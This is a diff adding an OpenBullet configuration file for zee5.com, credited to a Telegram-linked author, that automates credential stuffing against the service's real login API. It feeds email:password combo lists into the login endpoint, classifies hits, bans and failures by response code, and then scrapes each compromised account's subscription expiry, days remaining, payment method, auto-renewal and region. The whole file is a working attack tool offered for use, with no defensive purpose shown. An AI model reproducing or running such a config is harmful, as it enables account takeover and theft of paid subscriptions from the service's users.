@@ -1,0 +1,143 @@
+[SETTINGS]
+{
+  "Name": "zee5.com",
+  "SuggestedBots": 80,
+  "MaxCPM": 0,
+  "LastModified": "2021-09-26T16:40:38.6063084+03:30",
+  "AdditionalInfo": "https://t.me/Hogo_Victor",
+  "Author": "@Hogo_Victor",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Author Telegram Id:@Hogo_Victor | Telegram Channel: @Open_Bullet_Config",
+      "VariableName": "",
+      "Id": 1542831984
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://userapi.zee5.com/v2/user/loginemail" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: userapi.zee5.com" 
+  HEADER "Sec-Ch-Ua: \"Chromium\";v=\"93\", \" Not;A Brand\";v=\"99\"" 
+  HEADER "Accept: application/json" 
+  HEADER "Sec-Ch-Ua-Mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36" 
+  HEADER "Sec-Ch-Ua-Platform: \"Windows\"" 
+  HEADER "Origin: https://www.zee5.com" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.zee5.com/" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" EqualTo "401" 
+    KEY "<RESPONSECODE>" EqualTo "400" 
+  KEYCHAIN Success OR 
+    KEY "access_token\":\"" 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" EqualTo "403" 
+
+#access_token PARSE "<SOURCE>" JSON "access_token" -> VAR "access_token" 
+
+#Get REQUEST GET "https://subscriptionapi.zee5.com/v1/subscription?translation=en&country=&include_all=true" 
+  
+  HEADER "Host: subscriptionapi.zee5.com" 
+  HEADER "Sec-Ch-Ua: \"Chromium\";v=\"93\", \" Not;A Brand\";v=\"99\"" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36" 
+  HEADER "Sec-Ch-Ua-Mobile: ?0" 
+  HEADER "Authorization: bearer <access_token>" 
+  HEADER "Sec-Ch-Ua-Platform: \"Windows\"" 
+  HEADER "Origin: https://www.zee5.com" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.zee5.com/" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+IF "<SOURCE>" EqualTo "[]"
+SET STATUS CUSTOM "FREE"
+ENDIF
+
+#subscription_end PARSE "<SOURCE>" REGEX "\"subscription_end\":\"([0-9]{4}-[0-9]{2}-[0-9]{2})+" "[1]" Recursive=TRUE -> VAR "subscription_end" 
+
+#sub FUNCTION RegexMatch "( [0-9]{4}-[0-9]{2}-[0-9]{2})" "<subscription_end>" -> VAR "sub" 
+
+#expireDate FUNCTION Replace " " "" "<sub>" -> CAP "expireDate" 
+
+#unix FUNCTION DateToUnixTime "yyyy-MM-dd" "<expireDate>" -> VAR "unix" 
+
+#current FUNCTION CurrentUnixTime -> VAR "current" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<current>" GreaterThan "<unix>" 
+
+#compute FUNCTION Compute "(<unix>-<current>)/86400" -> VAR "compute" 
+
+#daysLeft FUNCTION Round "<compute>" -> CAP "daysLeft" 
+
+#S PARSE "<SOURCE>" LR "subscription_end\":\"<expireDate>" "used_billing_cycles" -> VAR "S" 
+
+#paymentMethod PARSE "<S>" LR "paymentmode\":\"" "\"" CreateEmpty=FALSE -> CAP "paymentMethod" 
+
+#AR PARSE "<S>" LR "recurring_enabled\":" "," -> VAR "AR" 
+
+#autoRenewal FUNCTION Translate 
+  KEY "false" VALUE "No" 
+  KEY "true" VALUE "Yes" 
+  "<AR>" -> CAP "autoRenewal" 
+
+#country PARSE "<S>" LR "country\":\"" "\"" CreateEmpty=FALSE -> CAP "country" 
+
+#region PARSE "<S>" LR "region\":\"" "\"" CreateEmpty=FALSE -> CAP "region" 
+
+SET CAP "Config By" "@Hogo_Victor"
+SET CAP "Telegram Channel" "https://t.me/OpenBulletChannel"
+
